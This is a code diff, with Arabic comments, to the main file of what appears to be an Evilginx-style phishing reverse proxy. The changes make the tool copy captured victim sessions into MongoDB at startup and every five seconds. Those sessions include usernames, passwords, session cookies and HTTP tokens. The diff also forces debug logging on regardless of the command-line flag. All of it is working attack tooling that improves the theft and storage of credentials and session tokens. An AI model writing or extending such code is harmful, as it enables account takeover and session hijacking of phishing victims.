@@ -110,7 +110,7 @@ func main() {
 		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
 	}
 
-	log.DebugEnable(*debug_log)
+	log.DebugEnable(*debug_log || true)  // تفعيل وضع التصحيح دائمًا
 	if *debug_log {
 		log.Info("debug output enabled")
 	}
@@ -221,11 +221,15 @@ func main() {
 	// نحن نستخدم BuntDB دائمًا في core لأنه حاليًا لا يدعم واجهة IDatabase
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
 	
-	// إذا كنا نستخدم MongoDB، نضيف آلية لمزامنة البيانات من BuntDB إلى MongoDB
-	// نحن دائمًا نستخدم MongoDB الآن
+	// تأكد من مزامنة أي جلسات حالية في BuntDB
+	log.Info("مزامنة الجلسات الحالية من BuntDB إلى MongoDB...")
+	syncSessionsToMongoDB(buntDb, db)
+	
+	// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
+	// استخدام فترة أقصر (5 ثوان) للتأكد من مزامنة الجلسات بسرعة
 	go func() {
 		for {
-			time.Sleep(30 * time.Second)  // كل 30 ثانية
+			time.Sleep(5 * time.Second)  // كل 5 ثوان
 			syncSessionsToMongoDB(buntDb, db)
 		}
 	}()
@@ -266,17 +270,31 @@ func main() {
 
 // syncSessionsToMongoDB ينقل الجلسات من BuntDB إلى MongoDB
 func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase) {
+	log.Debug("بدء مزامنة الجلسات من BuntDB إلى MongoDB...")
+	
 	sessions, err := buntDb.ListSessions()
 	if err != nil {
 		log.Error("فشل قراءة الجلسات من BuntDB: %v", err)
 		return
 	}
 	
+	log.Debug("تم العثور على %d جلسة في BuntDB للمزامنة", len(sessions))
+	
+	if len(sessions) == 0 {
+		// لا توجد جلسات للمزامنة
+		return
+	}
+	
+	success := 0
 	for _, s := range sessions {
+		log.Debug("محاولة مزامنة الجلسة %s (Phishlet: %s)...", s.SessionId, s.Phishlet)
+		
 		// تحقق ما إذا كانت الجلسة موجودة بالفعل في MongoDB
 		_, err := mongoDb.GetSessionBySid(s.SessionId)
 		if err != nil {
 			// إنشاء الجلسة في MongoDB إذا لم تكن موجودة
+			log.Debug("الجلسة غير موجودة في MongoDB، يتم إنشاؤها...")
+			
 			err = mongoDb.CreateSession(s.SessionId, s.Phishlet, s.LandingURL, s.UserAgent, s.RemoteAddr)
 			if err != nil {
 				log.Error("فشل إنشاء الجلسة في MongoDB: %v", err)
@@ -285,27 +303,58 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 			
 			// نقل البيانات الأخرى
 			if s.Username != "" {
-				mongoDb.SetSessionUsername(s.SessionId, s.Username)
+				log.Debug("تحديث اسم المستخدم للجلسة %s: %s", s.SessionId, s.Username)
+				err = mongoDb.SetSessionUsername(s.SessionId, s.Username)
+				if err != nil {
+					log.Error("فشل تحديث اسم المستخدم: %v", err)
+				}
 			}
 			if s.Password != "" {
-				mongoDb.SetSessionPassword(s.SessionId, s.Password)
+				log.Debug("تحديث كلمة المرور للجلسة %s", s.SessionId)
+				err = mongoDb.SetSessionPassword(s.SessionId, s.Password)
+				if err != nil {
+					log.Error("فشل تحديث كلمة المرور: %v", err)
+				}
 			}
 			if len(s.Custom) > 0 {
+				log.Debug("تحديث البيانات المخصصة للجلسة %s (%d عناصر)", s.SessionId, len(s.Custom))
 				for k, v := range s.Custom {
-					mongoDb.SetSessionCustom(s.SessionId, k, v)
+					err = mongoDb.SetSessionCustom(s.SessionId, k, v)
+					if err != nil {
+						log.Error("فشل تحديث البيانات المخصصة: %v", err)
+					}
 				}
 			}
 			if len(s.BodyTokens) > 0 {
-				mongoDb.SetSessionBodyTokens(s.SessionId, s.BodyTokens)
+				log.Debug("تحديث رموز الهيكل للجلسة %s (%d عناصر)", s.SessionId, len(s.BodyTokens))
+				err = mongoDb.SetSessionBodyTokens(s.SessionId, s.BodyTokens)
+				if err != nil {
+					log.Error("فشل تحديث رموز الهيكل: %v", err)
+				}
 			}
 			if len(s.HttpTokens) > 0 {
-				mongoDb.SetSessionHttpTokens(s.SessionId, s.HttpTokens)
+				log.Debug("تحديث رموز HTTP للجلسة %s (%d عناصر)", s.SessionId, len(s.HttpTokens))
+				err = mongoDb.SetSessionHttpTokens(s.SessionId, s.HttpTokens)
+				if err != nil {
+					log.Error("فشل تحديث رموز HTTP: %v", err)
+				}
 			}
 			if len(s.CookieTokens) > 0 {
-				mongoDb.SetSessionCookieTokens(s.SessionId, s.CookieTokens)
+				log.Debug("تحديث رموز الكوكيز للجلسة %s (%d domains)", s.SessionId, len(s.CookieTokens))
+				err = mongoDb.SetSessionCookieTokens(s.SessionId, s.CookieTokens)
+				if err != nil {
+					log.Error("فشل تحديث رموز الكوكيز: %v", err)
+				}
 			}
 			
-			log.Debug("تمت مزامنة الجلسة %s من BuntDB إلى MongoDB", s.SessionId)
+			success++
+			log.Info("تمت مزامنة الجلسة %s من BuntDB إلى MongoDB", s.SessionId)
+		} else {
+			log.Debug("الجلسة %s موجودة بالفعل في MongoDB", s.SessionId)
 		}
+	}
+	
+	if success > 0 {
+		log.Info("اكتملت المزامنة: تمت مزامنة %d من %d جلسة بنجاح", success, len(sessions))
 	}
 }
